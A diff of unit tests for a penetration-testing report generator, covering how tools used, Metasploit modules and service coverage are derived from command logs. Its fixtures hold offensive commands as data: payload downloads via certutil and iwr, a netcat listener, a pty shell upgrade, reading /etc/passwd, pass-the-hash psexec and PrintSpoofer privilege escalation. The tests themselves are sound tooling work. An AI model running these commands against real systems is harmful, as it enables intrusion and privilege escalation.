@@ -104,16 +104,57 @@ const entry = (id: string, command: string, extra: Partial<LogEntry> = {}) =>
   ({ id, kind: "command", hostIds: [H], private: false, content: { kind: "command", blocks: [{ command, output: "" }] }, ...extra }) as LogEntry;
 
 describe("toolsUsed", () => {
-  it("counts first tokens, skipping sudo and private entries", () => {
+  it("lists each tool once with its purpose and URL, skipping sudo and private entries", () => {
     const log = [
       entry("a", "nmap -sV 10.0.0.5"),
       entry("b", "sudo nmap -p- 10.0.0.5\nFOO=1 gobuster dir"),
       entry("c", "hydra x", { private: true }),
     ];
     expect(toolsUsed(log, [H])).toEqual([
-      { tool: "nmap", count: 2 },
-      { tool: "gobuster", count: 1 },
+      { tool: "gobuster", purpose: "Web content discovery", url: "https://github.com/OJ/gobuster" },
+      { tool: "nmap", purpose: "Port and service scanning", url: "https://nmap.org" },
     ]);
+  });
+  it("leaves out shell builtins and coreutils, including sudo -l and every segment of a chain", () => {
+    const log = [
+      entry("a", "whoami /priv\ntype C:\\x.txt\ncd /tmp && ls -la\ncat /etc/passwd | grep root\nsudo -l\nsudo tar -cf x y\nchmod 600 k && ssh -i k dev@10.0.0.5"),
+      entry("b", "iwr http://x/a.exe -OutFile a.exe\nInvoke-WebRequest http://x/b\necho hi\ncp a b\nmv a b\ndir"),
+      entry("c", "certutil -urlcache -f http://x/a.exe a.exe"),
+    ];
+    expect(toolsUsed(log, [H]).map((r) => [r.tool, r.purpose])).toEqual([
+      ["certutil", "File transfer"],
+      ["ssh", "Remote shell over SSH"],
+    ]);
+  });
+  it("names a tool's family once (winPEAS, PrintSpoofer, impacket) and keeps unknown tools with blank purpose", () => {
+    const log = [
+      entry("a", ".\\winPEASx64.exe quiet\nC:\\Windows\\Tasks\\PrintSpoofer64.exe -i -c cmd\nPrintSpoofer.exe -i"),
+      entry("b", "impacket-psexec a@b -hashes :x\nimpacket-GetUserSPNs a/b -request\nrlwrap nc -lvnp 443\nmytool --go"),
+    ];
+    expect(toolsUsed(log, [H]).map((r) => r.tool)).toEqual([
+      "impacket-GetUserSPNs",
+      "impacket-psexec",
+      "mytool",
+      "nc",
+      "PrintSpoofer",
+      "rlwrap",
+      "winPEAS",
+    ]);
+    expect(toolsUsed(log, [H]).find((r) => r.tool === "mytool")).toEqual({ tool: "mytool", purpose: "", url: "" });
+  });
+  it("counts python3 only when it runs a .py file, as the exploit runner", () => {
+    expect(toolsUsed([entry("a", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -m http.server 80")], [H])).toEqual([]);
+    expect(toolsUsed([entry("a", "python3 46153.py -u admin -i http://x")], [H]).map((r) => [r.tool, r.purpose])).toEqual([["python3", "Exploit runner"]]);
+  });
+  it("leaves out entries an operator or private attempt points at, and applies per-row overrides", () => {
+    const log = [entry("a", "PrintSpoofer32.exe -i"), entry("b", "hydra -l sa x")];
+    const attempts = [{ id: "t", hostId: H, reasonKind: "operator", private: true, logEntryId: "a" }] as never;
+    expect(toolsUsed(log, [H], { attempts, overrides: { hydra: { purpose: "MSSQL password guessing" } } })).toEqual([
+      { tool: "hydra", purpose: "MSSQL password guessing", url: "https://github.com/vanhauser-thc/thc-hydra" },
+    ]);
+  });
+  it("has no banned tools in its catalog", () => {
+    expect(toolsUsed([entry("a", "sqlmap -u x\nnessus\nopenvas")], [H]).every((r) => r.purpose === "")).toBe(true);
   });
 });
 
@@ -127,5 +168,61 @@ describe("msfModules", () => {
     expect(msfModules(log, { id: "e1", domain: null } as never, hosts)).toEqual([
       { hostId: H, module: "exploit/windows/smb/ms17_010_eternalblue" },
     ]);
+  });
+});
+
+describe("serviceCoverage from access", () => {
+  const cmdEntry = (id: string, command: string, extra: Partial<LogEntry> = {}) =>
+    ({ id, kind: "command", hostIds: [H], private: false, title: "step", content: { kind: "command", blocks: [{ command, output: "x" }] }, ...extra }) as LogEntry;
+  const base = () => {
+    const d = data();
+    d.findings = [];
+    d.attempts = [];
+    d.services = [
+      svc(22, { nmapService: "ssh" }),
+      svc(445, { nmapService: "microsoft-ds" }),
+      svc(5985, { nmapService: "http" }),
+      svc(8080, { nmapService: "http" }),
+    ] as never;
+    return d;
+  };
+  const by = (d: ReportData, p: number) => serviceCoverage(d, H, {}).find((r) => r.port === p)!;
+
+  it("reads a grant's linked entry: evil-winrm is 5985, ssh is 22", () => {
+    const d = base();
+    d.log = [cmdEntry("l1", "evil-winrm -i 10.0.0.5 -u j -p x"), cmdEntry("l2", "chmod 600 k && ssh -i k dev@10.0.0.5")];
+    d.grants = [
+      { hostId: H, level: "user", via: "Provided credentials", logEntryId: "l1", at: 1 },
+      { hostId: H, level: "user", via: "Key login", logEntryId: "l2", at: 2 },
+    ] as never;
+    expect(by(d, 5985)).toMatchObject({ result: "exploited", via: "Provided credentials" });
+    expect(by(d, 22)).toMatchObject({ result: "exploited", via: "Key login" });
+    expect(by(d, 445).result).toBe("untested");
+    // The same grant's entry names no web port: 8080 stays untested.
+    expect(by(d, 8080).result).toBe("untested");
+  });
+
+  it("reads a hop's via (psexec is 445) and a port named outright", () => {
+    const d = base();
+    d.hops = [
+      { fromHostId: "h2", toHostId: H, via: "Pass the hash (psexec)", logEntryId: null, at: 1 },
+      { fromHostId: "h2", toHostId: H, via: "Tomcat manager on 8080", logEntryId: null, at: 2 },
+    ] as never;
+    expect(by(d, 445)).toMatchObject({ result: "exploited", via: "Pass the hash (psexec)" });
+    expect(by(d, 8080)).toMatchObject({ result: "exploited", via: "Tomcat manager on 8080" });
+  });
+
+  it("ignores a private linked entry, other hosts' grants, and lets a finding and an override win", () => {
+    const d = base();
+    d.log = [cmdEntry("l1", "ssh dev@10.0.0.5", { private: true })];
+    d.grants = [
+      { hostId: H, level: "user", via: "Shell", logEntryId: "l1", at: 1 },
+      { hostId: "h2", level: "user", via: "ssh", logEntryId: null, at: 1 },
+    ] as never;
+    expect(by(d, 22).result).toBe("untested");
+    d.grants = [{ hostId: H, level: "user", via: "ssh login", logEntryId: null, at: 1 }] as never;
+    d.findings = [{ id: "f", title: "Weak SSH key", hostIds: [H], serviceIds: ["s22"] }] as never;
+    expect(by(d, 22)).toMatchObject({ result: "exploited", via: "Weak SSH key" });
+    expect(serviceCoverage(d, H, { s22: { result: "tested" } })[0].result).toBe("tested");
   });
 });
